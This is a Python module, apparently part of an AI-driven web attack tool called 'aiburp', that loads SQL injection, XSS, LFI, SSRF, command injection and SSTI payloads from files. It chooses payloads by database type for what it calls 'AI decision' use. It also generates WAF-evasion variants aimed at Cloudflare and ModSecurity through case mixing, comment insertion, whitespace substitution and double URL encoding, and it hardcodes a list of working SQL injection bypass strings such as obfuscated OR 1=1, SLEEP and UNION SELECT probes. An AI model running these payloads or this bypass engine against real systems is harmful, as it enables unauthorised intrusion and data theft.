"""
Payload 加载器

从 txt 文件按需加载 payload，像赌神一样精准出牌

目录结构:
    payloads/
    ├── sqli/
    │   ├── quick.txt        # 快速检测 (7个)
    │   ├── detection.txt    # 基础检测
    │   ├── time_based.txt   # 时间盲注
    │   ├── error_based.txt  # 报错注入
    │   ├── union.txt        # UNION 注入
    │   ├── auth_bypass.txt  # 登录绕过
    │   ├── stacked.txt      # 堆叠查询
    │   └── oob.txt          # 外带注入
    ├── xss/
    │   ├── quick.txt
    │   ├── basic.txt
    │   ├── bypass.txt
    │   ├── polyglot.txt
    │   └── dom.txt
    ├── lfi/
    │   ├── quick.txt
    │   ├── linux.txt
    │   ├── bypass.txt
    │   └── php_wrappers.txt
    ├── ssrf/
    │   ├── quick.txt
    │   ├── internal.txt
    │   ├── cloud_metadata.txt
    │   └── bypass.txt
    ├── cmdi/
    │   ├── quick.txt
    │   ├── linux.txt
    │   ├── windows.txt
    │   └── blind.txt
    ├── ssti/
    │   ├── quick.txt
    │   ├── detection.txt
    │   └── rce.txt
    └── bypass/
        ├── waf_space.txt
        ├── waf_encoding.txt
        ├── waf_quotes.txt
        ├── waf_keywords.txt
        ├── waf_advanced.txt
        ├── cloudflare.txt
        └── modsecurity.txt

使用:
    from aiburp.payloads import Payloads
    
    p = Payloads()
    
    # 快速测试
    for payload in p.sqli.quick:
        ...
    
    # 按需加载
    for payload in p.sqli.time_based:
        ...
    
    # WAF 绕过变体
    for payload in p.bypass.apply("' OR 1=1", "cloudflare"):
        ...
    
    # 策略选择 (AI 决策)
    payloads = p.sqli.select(
        db_type="mysql",      # 数据库类型
        injection_type="time", # 注入类型
        has_waf=True          # 是否有 WAF
    )
"""

import urllib.parse
from pathlib import Path
from typing import List, Dict, Optional, Iterator
from functools import cached_property


class PayloadFile:
    """单个 payload 文件"""
    
    def __init__(self, filepath: Path):
        self.filepath = filepath
        self._cache: Optional[List[str]] = None
    
    def load(self) -> List[str]:
        """加载 payload (带缓存)"""
        if self._cache is not None:
            return self._cache
        
        if not self.filepath.exists():
            return []
        
        payloads = []
        with open(self.filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                # 跳过空行和注释
                if line and not line.startswith('#'):
                    payloads.append(line)
        
        self._cache = payloads
        return payloads
    
    def __iter__(self) -> Iterator[str]:
        return iter(self.load())
    
    def __len__(self) -> int:
        return len(self.load())
    
    def __getitem__(self, index):
        return self.load()[index]


class PayloadCategory:
    """Payload 分类"""
    
    def __init__(self, category_dir: Path):
        self.dir = category_dir
        self._files: Dict[str, PayloadFile] = {}
    
    def __getattr__(self, name: str) -> PayloadFile:
        """动态加载 payload 文件"""
        if name.startswith('_'):
            raise AttributeError(name)
        
        if name not in self._files:
            filepath = self.dir / f"{name}.txt"
            self._files[name] = PayloadFile(filepath)
        
        return self._files[name]
    
    def list_files(self) -> List[str]:
        """列出所有可用的 payload 文件"""
        if not self.dir.exists():
            return []
        return [f.stem for f in self.dir.glob("*.txt")]
    
    def all(self) -> List[str]:
        """加载所有 payload"""
        result = []
        for name in self.list_files():
            result.extend(getattr(self, name).load())
        return list(set(result))  # 去重


class SQLiPayloads(PayloadCategory):
    """SQL 注入 Payload - 带策略选择"""
    
    def select(
        self,
        db_type: str = None,
        injection_type: str = None,
        has_waf: bool = False,
        is_blind: bool = False
    ) -> List[str]:
        """
        策略选择 - AI 决策用
        
        Args:
            db_type: mysql, mssql, postgresql, oracle, sqlite
            injection_type: detection, time, error, union, stacked
            has_waf: 是否有 WAF
            is_blind: 是否盲注
        
        Returns:
            根据条件筛选的 payload 列表
        """
        payloads = []
        
        # 基础选择
        if injection_type == "time" or is_blind:
            payloads.extend(self.time_based.load())
        elif injection_type == "error":
            payloads.extend(self.error_based.load())
        elif injection_type == "union":
            payloads.extend(self.union.load())
        elif injection_type == "stacked":
            payloads.extend(self.stacked.load())
        else:
            payloads.extend(self.detection.load())
        
        # 数据库特定过滤
        if db_type:
            db_keywords = {
                "mysql": ["SLEEP", "BENCHMARK", "EXTRACTVALUE", "UPDATEXML", "/*!"],
                "mssql": ["WAITFOR", "xp_cmdshell", "CONVERT", "CAST"],
                "postgresql": ["pg_sleep", "COPY", "dblink"],
                "oracle": ["DBMS_PIPE", "UTL_", "CTXSYS"],
                "sqlite": ["RANDOMBLOB", "sqlite"],
            }
            keywords = db_keywords.get(db_type.lower(), [])
            if keywords:
                payloads = [p for p in payloads if any(kw in p.upper() for kw in [k.upper() for k in keywords]) or not any(kw in p.upper() for kw in sum(db_keywords.values(), []))]
        
        return payloads


class BypassPayloads(PayloadCategory):
    """WAF 绕过 Payload"""
    
    def apply(self, payload: str, waf_type: str = None) -> List[str]:
        """
        对 payload 应用绕过技术
        
        Args:
            payload: 原始 payload
            waf_type: WAF 类型 (cloudflare, modsecurity, etc.)
        
        Returns:
            绕过变体列表
        """
        variants = [payload]
        
        # 空格绕过
        for space in self.waf_space.load():
            variants.append(payload.replace(' ', space))
        
        # 关键字绕过
        keywords = ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE']
        for kw in keywords:
            if kw in payload.upper():
                # 大小写混合
                mixed = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(kw))
                variants.append(payload.replace(kw, mixed).replace(kw.lower(), mixed))
                # 注释插入
                commented = '/**/'.join(kw)
                variants.append(payload.replace(kw, commented).replace(kw.lower(), commented.lower()))
        
        # WAF 特定绕过
        if waf_type:
            waf_file = getattr(self, waf_type, None)
            if waf_file:
                # 从 WAF 特定文件获取模板
                for template in waf_file.load():
                    if 'UNION' in template.upper() and 'UNION' in payload.upper():
                        # 替换 UNION SELECT 部分
                        variants.append(template)
        
        # URL 编码
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        return list(set(variants))


class Payloads:
    """
    Payload 管理器
    
    像赌神一样精准出牌：
    - quick: 快速试探 (3-7 个)
    - detection: 基础检测
    - 按需加载更多
    """
    
    def __init__(self, payload_dir: Path = None):
        if payload_dir is None:
            # 默认在包的上级目录
            payload_dir = Path(__file__).parent.parent / "payloads"
        self.dir = payload_dir
    
    @cached_property
    def sqli(self) -> SQLiPayloads:
        return SQLiPayloads(self.dir / "sqli")
    
    @cached_property
    def xss(self) -> PayloadCategory:
        return PayloadCategory(self.dir / "xss")
    
    @cached_property
    def lfi(self) -> PayloadCategory:
        return PayloadCategory(self.dir / "lfi")
    
    @cached_property
    def ssrf(self) -> PayloadCategory:
        return PayloadCategory(self.dir / "ssrf")
    
    @cached_property
    def cmdi(self) -> PayloadCategory:
        return PayloadCategory(self.dir / "cmdi")
    
    @cached_property
    def ssti(self) -> PayloadCategory:
        return PayloadCategory(self.dir / "ssti")
    
    @cached_property
    def bypass(self) -> BypassPayloads:
        return BypassPayloads(self.dir / "bypass")
    
    def list_categories(self) -> List[str]:
        """列出所有分类"""
        if not self.dir.exists():
            return []
        return [d.name for d in self.dir.iterdir() if d.is_dir()]


# 全局实例 (方便直接导入使用)
_payloads = None

def get_payloads() -> Payloads:
    global _payloads
    if _payloads is None:
        _payloads = Payloads()
    return _payloads


# 便捷访问
class SQLI:
    @staticmethod
    def _get():
        return get_payloads().sqli
    
    @property
    def quick(self) -> List[str]:
        return self._get().quick.load()
    
    @property
    def detection(self) -> List[str]:
        return self._get().detection.load()
    
    @property
    def time_based(self) -> List[str]:
        return self._get().time_based.load()
    
    @property
    def error_based(self) -> List[str]:
        return self._get().error_based.load()
    
    @property
    def union(self) -> List[str]:
        return self._get().union.load()
    
    @property
    def auth_bypass(self) -> List[str]:
        return self._get().auth_bypass.load()
    
    @property
    def waf_bypass(self) -> List[str]:
        """WAF 绕过 payload"""
        # 内置 WAF 绕过 payload
        return [
            # 空格绕过
            "'/**/OR/**/1=1--",
            "'%09OR%091=1--",
            "'%0aOR%0a1=1--",
            "'+OR+1=1--",
            # 注释绕过
            "/*!50000'*/OR/*!50000'1'='1*/--",
            "' /*!OR*/ '1'='1'--",
            # 大小写混合
            "' oR '1'='1'--",
            "' Or '1'='1'--",
            "' OR '1'='1'--",
            # 编码绕过
            "%27%20OR%20%271%27%3D%271",
            "%27%20OR%20%271%27%3D%271%27--",
            # 双写绕过
            "' OORR '1'='1'--",
            "' ANANDD 1=1--",
            # 时间盲注绕过
            "'/**/AND/**/SLEEP(3)--",
            "'%09AND%09SLEEP(3)--",
            "' AND BENCHMARK(5000000,SHA1('test'))--",
            # UNION 绕过
            "' /*!UNION*/ /*!SELECT*/ NULL--",
            "' UNION%0aSELECT%0aNULL--",
            "' UnIoN SeLeCt NULL--",
        ]
    
    @staticmethod
    def select(**kwargs) -> List[str]:
        return get_payloads().sqli.select(**kwargs)
    
    @staticmethod
    def all() -> List[str]:
        return get_payloads().sqli.all()


class XSS:
    @staticmethod
    def _get():
        return get_payloads().xss
    
    @property
    def quick(self) -> List[str]:
        return self._get().quick.load()
    
    @property
    def basic(self) -> List[str]:
        return self._get().basic.load()
    
    @property
    def bypass(self) -> List[str]:
        return self._get().bypass.load()
    
    @property
    def polyglot(self) -> List[str]:
        return self._get().polyglot.load()
    
    @staticmethod
    def all() -> List[str]:
        return get_payloads().xss.all()


class LFI:
    @staticmethod
    def _get():
        return get_payloads().lfi
    
    @property
    def quick(self) -> List[str]:
        return self._get().quick.load()
    
    @property
    def linux(self) -> List[str]:
        return self._get().linux.load()
    
    @property
    def bypass(self) -> List[str]:
        return self._get().bypass.load()
    
    @property
    def php_wrappers(self) -> List[str]:
        return self._get().php_wrappers.load()
    
    @staticmethod
    def all() -> List[str]:
        return get_payloads().lfi.all()


class SSRF:
    @staticmethod
    def _get():
        return get_payloads().ssrf
    
    @property
    def quick(self) -> List[str]:
        return self._get().quick.load()
    
    @property
    def internal(self) -> List[str]:
        return self._get().internal.load()
    
    @property
    def cloud_metadata(self) -> List[str]:
        return self._get().cloud_metadata.load()
    
    @property
    def bypass(self) -> List[str]:
        return self._get().bypass.load()
    
    @staticmethod
    def all() -> List[str]:
        return get_payloads().ssrf.all()


class CMDi:
    @staticmethod
    def _get():
        return get_payloads().cmdi
    
    @property
    def quick(self) -> List[str]:
        return self._get().quick.load()
    
    @property
    def linux(self) -> List[str]:
        return self._get().linux.load()
    
    @property
    def windows(self) -> List[str]:
        return self._get().windows.load()
    
    @property
    def blind(self) -> List[str]:
        return self._get().blind.load()
    
    @staticmethod
    def all() -> List[str]:
        return get_payloads().cmdi.all()


class SSTI:
    @staticmethod
    def _get():
        return get_payloads().ssti
    
    @property
    def quick(self) -> List[str]:
        return self._get().quick.load()
    
    @property
    def detection(self) -> List[str]:
        return self._get().detection.load()
    
    @property
    def rce(self) -> List[str]:
        return self._get().rce.load()
    
    @staticmethod
    def all() -> List[str]:
        return get_payloads().ssti.all()


class Bypass:
    @staticmethod
    def apply(payload: str, waf_type: str = None) -> List[str]:
        return get_payloads().bypass.apply(payload, waf_type)


# 实例化便捷类
SQLI = SQLI()
XSS = XSS()
LFI = LFI()
SSRF = SSRF()
CMDi = CMDi()
SSTI = SSTI()
